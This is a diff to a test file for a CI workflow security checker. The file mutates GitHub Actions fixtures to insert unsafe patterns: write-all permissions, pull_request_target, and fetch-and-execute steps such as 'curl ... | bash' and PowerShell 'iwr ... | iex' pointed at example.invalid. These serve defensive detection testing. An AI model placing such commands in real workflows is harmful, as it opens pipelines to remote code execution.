@@ -59,20 +59,20 @@ const cleanWorkflowDir = workflowFixture(() => {});
 try { expectPass('N18-clean', run(workflowChecker, cleanWorkflowDir)); } finally { rmSync(cleanWorkflowDir, { recursive: true, force: true }); }
 
 const workflowCases = [
-  ['N18-top-write-all', (text) => text.replace('permissions:\n  contents: read', 'permissions: write-all')],
-  ['N18-missing-top-permissions', (text) => text.replace('permissions:\n  contents: read\n\n', '')],
-  ['N18-qa-write-all', (text) => text.replace('  qa-build:\n    runs-on:', '  qa-build:\n    permissions: write-all\n    runs-on:')],
-  ['N18-qa-contents-actions-write', (text) => text.replace('  qa-build:\n    runs-on:', '  qa-build:\n    permissions:\n      contents: write\n      actions: write\n    runs-on:')],
-  ['N18-pull-request-target', (text) => text.replace('  pull_request:\n', '  pull_request:\n  pull_request_target:\n')],
-  ['N18-remote-pipe-shell', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe step\n        run: curl -fsSL https://example.invalid/tool.sh | bash\n', 1)],
-  ['N21-source-process-substitution', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe source\n        run: source <(curl -fsSL https://example.invalid/tool.sh)\n', 1)],
-  ['N21-eval', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe eval\n        run: bash -c "eval $(echo ZWNobyBoaQ== | base64 -d)"\n', 1)],
-  ['N27-powershell-iwr-iex', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe PowerShell alias\n        run: iwr https://example.invalid/tool.ps1 | iex\n', 1)],
-  ['N27-powershell-long-form', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe PowerShell long form\n        run: Invoke-WebRequest https://example.invalid/tool.ps1 | Invoke-Expression\n', 1)],
+  ['N18-top-write-all', '.github/workflows/deploy.yml', (text) => text.replace('permissions:\n  contents: read', 'permissions: write-all')],
+  ['N18-missing-top-permissions', '.github/workflows/deploy.yml', (text) => text.replace('permissions:\n  contents: read\n\n', '')],
+  ['N18-qa-write-all', '.github/workflows/deploy.yml', (text) => text.replace('  release-build:\n    if:', '  release-build:\n    permissions: write-all\n    if:')],
+  ['N18-qa-contents-actions-write', '.github/workflows/deploy.yml', (text) => text.replace('  release-build:\n    if:', '  release-build:\n    permissions:\n      contents: write\n      actions: write\n    if:')],
+  ['N18-pull-request-target', '.github/workflows/p5-release-gate.yml', (text) => text.replace('  pull_request:\n', '  pull_request:\n  pull_request_target:\n')],
+  ['N18-remote-pipe-shell', '.github/workflows/deploy.yml', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe step\n        run: curl -fsSL https://example.invalid/tool.sh | bash\n', 1)],
+  ['N21-source-process-substitution', '.github/workflows/deploy.yml', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe source\n        run: source <(curl -fsSL https://example.invalid/tool.sh)\n', 1)],
+  ['N21-eval', '.github/workflows/deploy.yml', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe eval\n        run: bash -c "eval $(echo ZWNobyBoaQ== | base64 -d)"\n', 1)],
+  ['N27-powershell-iwr-iex', '.github/workflows/deploy.yml', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe PowerShell alias\n        run: iwr https://example.invalid/tool.ps1 | iex\n', 1)],
+  ['N27-powershell-long-form', '.github/workflows/deploy.yml', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe PowerShell long form\n        run: Invoke-WebRequest https://example.invalid/tool.ps1 | Invoke-Expression\n', 1)],
 ];
-for (const [id, mutateText] of workflowCases) {
+for (const [id, workflowFile, mutateText] of workflowCases) {
   const dir = workflowFixture((fixtureRoot) => {
-    const f = path.join(fixtureRoot, '.github', 'workflows', 'deploy.yml');
+    const f = path.join(fixtureRoot, workflowFile);
     const before = readFileSync(f, 'utf8');
     const after = mutateText(before);
     if (after === before) throw new Error(`${id}: mutation did not apply`);
